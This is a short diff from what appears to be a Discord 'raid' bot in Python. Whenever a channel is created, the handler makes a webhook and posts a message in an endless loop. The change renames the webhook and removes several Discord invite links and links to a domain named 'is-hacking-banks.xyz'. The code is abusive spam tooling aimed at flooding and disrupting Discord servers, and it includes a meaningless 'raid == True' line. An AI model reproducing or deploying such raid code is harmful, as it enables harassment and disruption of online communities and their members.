@@ -738,7 +738,7 @@ async def on_guild_channel_create(channel):
   global checkweb
   raid == True
   if checkweb == True:
-      webhook = await channel.create_webhook(name="LeonDev")
+      webhook = await channel.create_webhook(name="Sesso")
       try:
           while True:
               await webhook.send("""
@@ -751,11 +751,7 @@ async def on_guild_channel_create(channel):
 ```
 https://www.youtube.com/watch?v=5dmYmZU4y7Y
 https://www.youtube.com/watch?v=TusFQu7KV74
-https://discord.gg/jqucdtRsmX
-https://discord.gg/USTTajuUbf
 
-https://sesso-oscuro.is-hacking-banks.xyz/📞😑🚶👮😎
-https://sesso-oscuro.is-hacking-banks.xyz/✖🕔📡🔅🐯
 **KURWA!**
 """)
       except:
